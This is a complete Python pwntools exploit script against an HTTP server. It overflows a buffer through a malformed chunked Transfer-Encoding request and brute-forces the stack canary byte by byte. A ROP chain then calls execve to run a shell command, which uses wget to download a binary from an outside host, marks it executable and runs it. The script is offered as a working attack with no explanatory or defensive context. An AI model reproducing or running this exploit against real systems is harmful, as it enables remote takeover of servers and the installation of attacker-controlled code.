from pwn import *

context.log_level = 'critical'

CANARY_OFFSET = 4104
RET_OFFSET    = 24

RW_ADDR     = 0x67A420 
POP_RDI     = 0x403fbb
POP_RSI     = 0x4083f6
POP_RAX     = 0x46e50b
EXECVE      = 0x402816

# 0x0000000000408e20 : mov qword ptr [rdi], rsi ; ret
MOV_RDI_RSI = 0x408e20

# 0x000000000040c4df : mov rdx, rax ; mov byte ptr [rdx + 0x20], 0 ; ret
MOV_RDX_RAX = 0x40c4df

def base_payload():
    payload = b'GET / HTTP/1.1\n'
    payload += b'Host: 192.168.205.184\n'
    payload += b'Transfer-Encoding: chunked\n\n'
    payload += b'ABFFFFFFFFFFFFFF; '

    padding = b'a' * (1024 - len(payload))
    payload += padding
    payload += b'k' * CANARY_OFFSET

    return payload

def canary_brute(ip, port):
    canary = b''

    for byte_num in range(8):
        for byte in range(256):
            io = remote(ip, port)

            payload = base_payload()
            
            guess = canary + p8(byte)
            payload += guess

            try:
                io.send(payload)
                res = io.recv(1024)

                if b'HTTP/1.1 200 OK' in res:
                    canary += p8(byte)
                    break
                
            except:
                pass
            finally:
                io.close()
        
        print(f'Bruted {byte_num + 1} byte: {canary}')
    
    return canary

def pad(bytes, mul):
    remainder = len(bytes) % mul

    if not remainder:
        return bytes

    return bytes + b'\x00' * (mul - remainder)

def pad_argv(argv):
    res = []
    argv = [arg.encode() for arg in argv]

    for arg in argv:
        if arg[-1] != b'\x00':
            arg += b'\x00'
        
        arg = pad(arg, 8)
        res.append(arg)
    return res

def write_to_addr(addr, value):
    payload = b''
    payload += p64(POP_RSI)
    payload += value
    
    payload += p64(POP_RDI)
    payload += p64(addr)
    
    payload += p64(MOV_RDI_RSI)
    return payload

def write_str(addr, string):
    payload = b''
    for idx in range(0, len(string), 8):
        payload += write_to_addr(addr + idx, string[idx:idx + 8])
    return payload



def rop_chain(ip, port, canary, argv):
    io = remote(ip, port)

    payload = base_payload()
    payload += canary
    payload += b'A' * RET_OFFSET

    # prepare args as null terminated strings
    argv = pad_argv(argv)
    arg_addrs = []
    addr = RW_ADDR
    rdi = addr

    # 1. write arg strings to memory
    for arg in argv:
        payload += write_str(addr, arg)
        arg_addrs.append(addr)
        addr += len(arg)

    rsi = addr

    # 2. create argv in memory
    for arg_idx, arg in enumerate(argv):
        payload += write_to_addr(addr, p64(arg_addrs[arg_idx]))
        addr += 8

    # also add ending 0 of argv
    payload += write_to_addr(addr, p64(0))
    addr += 8

    # 3. create envp in memory
    payload += write_to_addr(addr, b'A=123\x00\x00\x00')
    payload += write_to_addr(addr + 8, p64(addr))
    payload += write_to_addr(addr + 16, p64(0))
    rdx = addr + 8

    # 4. args for execve
    payload += p64(POP_RDI)
    payload += p64(rdi)

    payload += p64(POP_RSI)
    payload += p64(rsi)
    
    payload += p64(POP_RAX)
    payload += p64(rdx)
    
    payload += p64(MOV_RDX_RAX)

    payload += p64(EXECVE)

    io.send(payload)

def main():
    ip = '192.168.205.184'
    port = 80

    canary = canary_brute(ip, port)

    shell_path = "/tmp/shell"
    shell_url = "http://172.24.52.63:12012/LIABLE_KAZOO"

    argv = [
        "/bin/sh",
        "-c",
        f"/usr/bin/wget -O {shell_path} {shell_url}; /bin/chmod 777 {shell_path}; {shell_path}"
    ]

    rop_chain(ip, port, canary, argv)


if __name__ == '__main__':
    main()